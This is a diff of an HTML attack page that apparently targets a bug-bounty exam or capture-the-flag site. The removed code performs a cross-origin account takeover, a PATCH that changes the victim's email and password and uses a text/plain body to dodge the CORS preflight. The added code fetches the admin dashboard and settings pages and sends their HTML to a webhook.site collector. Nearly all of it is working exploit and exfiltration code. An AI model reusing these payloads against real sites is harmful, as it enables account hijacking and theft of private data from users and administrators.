@@ -2,37 +2,28 @@
 <html>
 <body>
     <script>
-        const target = "https://api-bugbounty-exam.hashacademy.co/api/auth/profile";
         const webhook = "https://webhook.site/841a65c5-0695-459d-80da-91ae7613c283";
-        const newEmail = "ladybughunter1@gmail.com";
-
-        // 1. Log arrival
-        fetch(webhook + "?bot_is_here=true");
-
-        // 2. The "Simple" PATCH (Bypasses Preflight)
-        // We use text/plain but format it as JSON. 
-        // Some servers accept this to avoid CORS.
-        fetch(target, {
-            method: "PATCH",
-            mode: "no-cors", 
-            headers: { "Content-Type": "text/plain" },
-            body: JSON.stringify({
-                "email": newEmail,
-                "fullName": "HACKED_ADMIN",
-                "password": "Password123!",
-                "confirmPassword": "Password123!"
-            })
-        });
-
-        // 3. The "Direct Exfiltration" (In case we can't change the account)
-        // This tries to read the flag directly from the profile page
-        fetch(target)
+        
+        // 1. Try to find the Flag on the Admin Dashboard
+        // We fetch the HTML of the admin page, not the API
+        fetch("https://bugbounty-exam.hashacademy.co/admin/dashboard")
             .then(r => r.text())
-            .then(data => {
+            .then(html => {
                 fetch(webhook, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: "LOOT_DATA: " + data
+                    method: "POST",
+                    mode: "no-cors",
+                    body: "DASHBOARD_HTML: " + html
+                });
+            });
+
+        // 2. Try to find a "Messages" or "Settings" page
+        fetch("https://bugbounty-exam.hashacademy.co/admin/settings")
+            .then(r => r.text())
+            .then(html => {
+                fetch(webhook, {
+                    method: "POST",
+                    mode: "no-cors",
+                    body: "SETTINGS_HTML: " + html
                 });
             });
     </script>
